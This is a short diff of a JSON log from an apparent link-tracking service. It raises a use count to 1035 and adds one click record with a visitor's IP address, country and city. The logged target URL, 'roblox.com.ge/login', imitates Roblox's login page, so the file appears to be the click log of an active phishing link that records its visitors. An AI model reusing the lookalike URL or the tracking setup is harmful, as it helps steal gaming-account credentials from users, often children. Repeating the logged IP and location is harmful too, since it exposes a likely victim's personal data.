@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1034,
+    "useCount": 1035,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8392,6 +8392,14 @@
         "city": "Pattaya",
         "flag": "🇹🇭",
         "countryCode": "TH"
+      },
+      {
+        "timestamp": 1777232228752,
+        "ip": "85.244.130.163",
+        "country": "Portugal",
+        "city": "Vila Real de Santo António",
+        "flag": "🇵🇹",
+        "countryCode": "PT"
       }
     ]
   },
